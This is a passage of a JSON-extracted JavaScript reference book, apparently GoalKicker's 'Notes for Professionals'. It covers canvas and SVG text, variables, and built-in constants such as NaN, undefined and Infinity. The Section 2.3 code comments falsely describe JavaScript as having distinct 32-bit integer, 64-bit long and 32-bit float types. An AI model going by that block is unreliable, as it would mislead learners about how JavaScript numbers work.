        "text": "The argument is optional and not required by the speci\ufb01cation. Dialog boxes are modal windows - they prevent the user from accessing the rest of the program's interface until the dialog box is closed. For this reason, you should not overuse any function that creates a dialog box (or modal window). And regardless, there are very good reasons to avoid using dialog boxes for con\ufb01rmation. Starting with Chrome 46.0 this method is blocked inside an  <iframe>  unless its sandbox attribute has the value allow-modal. It is commonly accepted to call the con\ufb01rm method with the window notation removed as the window object is always implicit. However, it is recommended to explicitly de\ufb01ne the window object as expected behavior may change due to implementation at a lower scope level with similarly named methods.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 1.6: Using the DOM API (with graphical text: Canvas, SVG, or image \ufb01le)",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Using canvas elements",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "HTML provides the canvas element for building raster-based images. First build a canvas for holding image pixel information.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  canvas  =  document. createElement ( 'canvas' ); canvas. width   =   500 ; canvas. height   =   250 ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Then select a context for the canvas, in this case two-dimensional:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  ctx  =  canvas. getContext ( '2d' );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Then set properties related to the text:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "ctx. font   =   '30px Cursive' ; ctx. fillText ( \"Hello world!\" ,   50 ,   50 );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Then insert the  canvas  element into the page to take e\ufb00ect:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "document. body . appendChild ( canvas );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Using SVG",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "SVG is for building scalable vector-based graphics and can be used within HTML. First create an SVG element container with dimensions:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  svg  =  document. createElementNS ( 'http://www.w3.org/2000/svg' ,   'svg' ); svg. width   =   500 ; svg. height   =   50 ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Then build a  text  element with the desired positioning and font characteristics:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  text  =  document. createElementNS ( 'http://www.w3.org/2000/svg' ,   'text' ); text. setAttribute ( 'x' ,   '0' );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 9",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "text. setAttribute ( 'y' ,   '50' ); text. style . fontFamily   =   'Times New Roman' ; text. style . fontSize   =   '50' ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Then add the actual text to display to the  text element:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "text. textContent   =   'Hello world!' ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Finally add the  text  element to our  svg  container and add the  svg  container element to the HTML document:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "svg. appendChild ( text ); document. body . appendChild ( svg );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Image \ufb01le",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "If you already have an image \ufb01le containing the desired text and have it placed on a server, you can add the URL of the image and then add the image to the document as follows:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  img  =   new  Image (); img. src   =   'https://i.ytimg.com/vi/zecueq-mo4M/maxresdefault.jpg' ; document. body . appendChild ( img );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 10",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 2: JavaScript Variables",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "variable_name {Required} The name of the variable: used when calling it. =",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "[Optional]  Assignment (de\ufb01ning the variable) value",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "{Required when using Assignment}  The value of a variable  [default: unde\ufb01ned]",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Variables are what make up most of JavaScript. These variables make up things from numbers to objects, which are all over JavaScript to make one's life much easier.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 2.1: De\ufb01ning a Variable",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "var  myVariable  =   \"This is a variable!\" ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This is an example of de\ufb01ning variables. This variable is called a \"string\" because it has ASCII characters ( A - Z ,  0 - 9 , !@ #$ , etc.)",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 2.2: Using a Variable",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "var  number1  =   5 ; number1  =   3 ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Here, we de\ufb01ned a number called \"number1\" which was equal to 5. However, on the second line, we changed the value to 3. To show the value of a variable, we log it to the console or use  window. alert () :",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "console. log ( number1 );   // 3 window. alert ( number1 );   // 3",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "To add, subtract, multiply, divide, etc., we do like so:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "number1  =  number1  +   5 ;   // 3 + 5 = 8 number1  =  number1  -   6 ;   // 8 - 6 = 2 var  number2  =  number1  *   10 ;   // 2 (times) 10 = 20 var  number3  =  number2  /  number1 ;   // 20 (divided by) 2 = 10;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "We can also add strings which will concatenate them, or put them together. For example:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  myString  =   \"I am a \"   +   \"string!\" ;   // \"I am a string!\"",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 2.3: Types of Variables",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "var  myInteger  =   12 ;   // 32-bit number (from -2,147,483,648 to 2,147,483,647) var  myLong  =   9310141419482 ;   // 64-bit number (from -9,223,372,036,854,775,808 to 9,223,372,036,854,775,807) var  myFloat  =   5.5 ;   // 32-bit floating-point number (decimal) var  myDouble  =   9310141419482.22 ;   // 64-bit floating-point number var  myBoolean  =   true ;   // 1-bit true/false (0 or 1)",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  myBoolean2  =   false ; var  myNotANumber  =   NaN ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  NaN_Example  =   0 / 0 ;   // NaN: Division by Zero is not possible var  notDefined ;   // undefined: we didn't define it to anything yet",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "window. alert ( aRandomVariable );   // undefined",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 11",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  myNull  =   null ;   // null",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// etc...",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 2.4: Arrays and Objects",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "var  myArray  =   [];   // empty array",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "An array is a set of variables. For example:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  favoriteFruits  =   [ \"apple\" ,   \"orange\" ,   \"strawberry\" ]; var  carsInParkingLot  =   [ \"Toyota\" ,   \"Ferrari\" ,   \"Lexus\" ]; var  employees  =   [ \"Billy\" ,   \"Bob\" ,   \"Joe\" ]; var  primeNumbers  =   [ 2 ,   3 ,   5 ,   7 ,   11 ,   13 ,   17 ,   19 ,   23 ,   29 ,   31 ]; var  randomVariables  =   [ 2 ,   \"any type works\" ,   undefined ,   null ,   true ,   2.51 ]; myArray  =   [ \"zero\" ,   \"one\" ,   \"two\" ];",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "window. alert ( myArray [ 0 ]);   // 0 is the first element of an array                            // in this case, the value would be \"zero\"",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "myArray  =   [ \"John Doe\" ,   \"Billy\" ]; elementNumber  =   1 ; window. alert ( myArray [ elementNumber ]);   // Billy",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "An object is a group of values; unlike arrays, we can do something better than them:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "myObject  =   {}; john  =   { firstname :   \"John\" ,  lastname :   \"Doe\" ,  fullname :   \"John Doe\" }; billy  =   {     firstname :   \"Billy\" ,     lastname :   undefined ,     fullname :   \"Billy\" }; window. alert ( john. fullname );   // John Doe window. alert ( billy. firstname );   // Billy",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Rather than making an array  [ \"John Doe\" ,   \"Billy\" ]  and calling  myArray [ 0 ] , we can just call  john. fullname  and",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "billy. fullname .",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 12",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 3: Built-in Constants",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "Section 3.1: null",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "null  is used for representing the intentional absence of an object value and is a primitive value. Unlike  undefined , it is not a property of the global object. It is equal to  undefined  but not identical to it.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "null   ==   undefined ;   // true null   ===   undefined ;   // false",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "CAREFUL : The  typeof   null  is  'object' .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "typeof   null ;   // 'object';",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "To properly check if a value is  null , compare it with the strict equality operator",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  a  =   null ;",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "a  ===   null ;   // true",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 3.2: Testing for NaN using isNaN()",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "window. isNaN ()",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The global function  isNaN ()  can be used to check if a certain value or expression evaluates to  NaN . This function (in short) \ufb01rst checks if the value is a number, if not tries to convert it (*), and then checks if the resulting value is  NaN .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "For this reason,  this testing method may cause confusion .",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "(*) The \"conversion\" method is not that simple, see  ECMA-262 18.2.3  for a detailed explanation of the algorithm. These examples will help you better understand the  isNaN ()  behavior:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "isNaN ( NaN );            // true",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "isNaN ( 1 );              // false: 1 is a number isNaN (- 2e - 4 );          // false: -2e-4 is a number (-0.0002) in scientific notation isNaN ( Infinity );       // false: Infinity is a number isNaN ( true );           // false: converted to 1, which is a number isNaN ( false );          // false: converted to 0, which is a number isNaN ( null );           // false: converted to 0, which is a number isNaN ( \"\" );             // false: converted to 0, which is a number isNaN ( \" \" );            // false: converted to 0, which is a number isNaN ( \"45.3\" );         // false: string representing a number, converted to 45.3 isNaN ( \"1.2e3\" );        // false: string representing a number, converted to 1.2e3 isNaN ( \"Infinity\" );     // false: string representing a number, converted to Infinity isNaN ( new  Date );       // false: Date object, converted to milliseconds since epoch isNaN ( \"10$\" );          // true : conversion fails, the dollar sign is not a digit isNaN ( \"hello\" );        // true : conversion fails, no digits at all isNaN ( undefined );      // true : converted to NaN isNaN ();               // true : converted to NaN (implicitly undefined) isNaN ( function (){});   // true : conversion fails isNaN ({});             // true : conversion fails isNaN ([ 1 ,   2 ]);         // true : converted to \"1, 2\", which can't be converted to a number",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This last one is a bit tricky: checking if an  Array  is  NaN . To do this, the  Number ()  constructor \ufb01rst converts the array",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 13",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "to a string, then to a number; this is the reason why  isNaN ([])  and  isNaN ([ 34 ])  both return  false , but  isNaN ([ 1 , 2 ])  and  isNaN ([ true ])  both return  true : because they get converted to  \"\" ,  \"34\" ,  \"1,2\"  and  \"true\"  respectively. In",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "general,  an array is considered  NaN  by  isNaN ()  unless it only holds one element whose string representation can be converted to a valid number .",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Version \u2265 6",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "Number. isNaN ()",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "In ECMAScript 6, the  Number. isNaN ()  function has been implemented primarily to avoid the problem of window. isNaN ()  of forcefully converting the parameter to a number.  Number. isNaN () , indeed,  doesn't try to convert  the value to a number before testing. This also means that  only values of the type number, that are also  NaN , return  true  (which basically means only  Number. isNaN ( NaN ) ). From  ECMA-262 20.1.2.4 : When the  Number. isNaN  is called with one argument  number , the following steps are taken: If Type(number) is not Number, return  false . 1. If number is  NaN , return  true . 2. Otherwise, return  false . 3. Some examples:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "// The one and only",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Number. isNaN ( NaN );            // true",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Numbers",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Number. isNaN ( 1 );              // false Number. isNaN (- 2e - 4 );          // false Number. isNaN ( Infinity );       // false",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Values not of type number",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Number. isNaN ( true );           // false Number. isNaN ( false );          // false Number. isNaN ( null );           // false Number. isNaN ( \"\" );             // false Number. isNaN ( \" \" );            // false Number. isNaN ( \"45.3\" );         // false Number. isNaN ( \"1.2e3\" );        // false Number. isNaN ( \"Infinity\" );     // false Number. isNaN ( new  Date );       // false Number. isNaN ( \"10$\" );          // false Number. isNaN ( \"hello\" );        // false Number. isNaN ( undefined );      // false Number. isNaN ();               // false Number. isNaN ( function (){});   // false Number. isNaN ({});             // false Number. isNaN ([]);             // false Number. isNaN ([ 1 ]);            // false Number. isNaN ([ 1 ,   2 ]);         // false Number. isNaN ([ true ]);         // false",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 3.3: NaN",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "NaN  stands for \"Not a Number.\" When a mathematical function or operation in JavaScript cannot return a speci\ufb01c number, it returns the value  NaN  instead.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 14",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "It is a property of the global object, and a reference to  Number. NaN",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "window. hasOwnProperty ( 'NaN' );   // true",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "NaN ;   // NaN",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Perhaps confusingly,  NaN  is still considered a number.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "typeof   NaN ;   // 'number'",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Don't check for  NaN  using the equality operator. See  isNaN  instead.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "NaN   ==   NaN    // false NaN   ===   NaN   // false",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 3.4: unde\ufb01ned and null",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "At \ufb01rst glance it may appear that  null  and  undefined  are basically the same, however there are subtle but important di\ufb00erences. undefined  is the absence of a value in the compiler, because where it should be a value, there hasn't been put one, like the case of an unassigned variable. undefined  is a global value that represents the absence of an assigned value.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "typeof   undefined   ===   'undefined'",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "null  is an object that indicates that a variable has been explicitly assigned \"no value\".",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "typeof   null   ===   'object'",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Setting a variable to  undefined  means the variable e\ufb00ectively does not exist. Some processes, such as JSON serialization, may strip  undefined  properties from objects. In contrast,  null  properties indicate will be preserved so you can explicitly convey the concept of an \"empty\" property. The following evaluate to  undefined : A variable when it is declared but not assigned a value (i.e. de\ufb01ned)",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "let  foo ; console. log ( 'is undefined?' ,  foo  ===   undefined );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// is undefined? true",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Accessing the value of a property that doesn't exist",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "let  foo  =   {  a :   'a'   }; console. log ( 'is undefined?' ,  foo. b   ===   undefined );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// is undefined? true",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The return value of a function that doesn't return a value",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  foo ()   {   return ;   }",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "console. log ( 'is undefined?' ,  foo ()   ===   undefined );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// is undefined? true",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The value of a function argument that is declared but has been omitted from the function call",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  foo ( param )   {   console. log ( 'is undefined?' ,  param  ===   undefined ); } foo ( 'a' ); foo ();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// is undefined? false // is undefined? true",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 15",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "undefined  is also a property of the global  window  object.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "// Only in browsers",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "console. log ( window. undefined );   // undefined window. hasOwnProperty ( 'undefined' );   // true    ",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Version < 5",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "Before ECMAScript 5 you could actually change the value of the  window. undefined  property to any other value potentially breaking everything.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 3.5: In\ufb01nity and -In\ufb01nity",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "1   /   0 ;   // Infinity // Wait! WHAAAT?",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Infinity  is a property of the global object (therefore a global variable) that represents mathematical in\ufb01nity. It is a",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "reference to  Number. POSITIVE_INFINITY",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "It is greater than any other value, and you can get it by dividing by 0 or by evaluating the expression of a number that's so big that over\ufb02ows. This actually means there is no division by 0 errors in JavaScript, there is In\ufb01nity! There is also  - Infinity  which is mathematical negative in\ufb01nity, and it's lower than any other value. To get  - Infinity  you negate  Infinity , or get a reference to it in  Number. NEGATIVE_INFINITY .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "-   ( Infinity );   // -Infinity",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Now let's have some fun with examples:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Infinity   >   123192310293 ;   // true - Infinity   <   - 123192310293 ;   // true",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "1   /   0 ;   // Infinity",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Math. pow ( 123123123 ,   9123192391023 );   // Infinity Number. MAX_VALUE   *   2 ;   // Infinity",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "23   /   Infinity ;   // 0",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "- Infinity ;   // -Infinity",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "- Infinity   ===  Number. NEGATIVE_INFINITY ;   // true",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "- 0 ;   // -0 , yes there is a negative 0 in the language",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "0   ===   - 0 ;   // true",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "1   /   - 0 ;   // -Infinity",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "1   /   0   ===   1   /   - 0 ;   // false",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Infinity   +   Infinity ;   // Infinity",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  a  =   0 ,  b  =   - 0 ; a  ===  b ;   // true 1   /  a  ===   1   /  b ;   // false",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Try your own!",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 3.6: Number constants",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "The  Number  constructor has some built in constants that can be useful",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Number. MAX_VALUE ;            // 1.7976931348623157e+308 Number. MAX_SAFE_INTEGER ;     // 9007199254740991",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 16",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Number. MIN_VALUE ;            // 5e-324 Number. MIN_SAFE_INTEGER ;     // -9007199254740991",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Number. EPSILON ;              // 0.0000000000000002220446049250313",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Number. POSITIVE_INFINITY ;    // Infinity Number. NEGATIVE_INFINITY ;    // -Infinity Number. NaN ;                  // NaN",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "In many cases the various operators in JavaScript will break with values outside the range of",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "( Number. MIN_SAFE_INTEGER ,  Number. MAX_SAFE_INTEGER )",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Note that  Number. EPSILON  represents the di\ufb00erent between one and the smallest  Number  greater than one, and thus the smallest possible di\ufb00erence between two di\ufb00erent  Number  values. One reason to use this is due to the nature of how numbers are stored by JavaScript see Check the equality of two numbers",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 3.7: Operations that return NaN",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Mathematical operations on values other than numbers return NaN.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "\"b\"   *   3 \"cde\"   -   \"e\" [ 1 ,   2 ,   3 ]   *   2",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "An exception: Single-number arrays.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "[ 2 ]   *   [ 3 ]    // Returns 6",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Also, remember that the  +  operator concatenates strings.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "\"a\"   +   \"b\"    // Returns \"ab\"",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Dividing zero by zero returns  NaN .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "0   /   0           // NaN",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Note: In mathematics generally (unlike in JavaScript programming), dividing by zero is not possible.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 3.8: Math library functions that return NaN",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Generally,  Math  functions that are given non-numeric arguments will return NaN.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Math. floor ( \"a\" )",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The square root of a negative number returns NaN, because  Math. sqrt  does not support  imaginary  or  complex numbers.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Math. sqrt (- 1 )",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 17",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 4: Comments",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "Section 4.1: Using Comments",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "To add annotations, hints, or exclude some code from being executed JavaScript provides two ways of commenting code lines",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Single line Comment  //",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
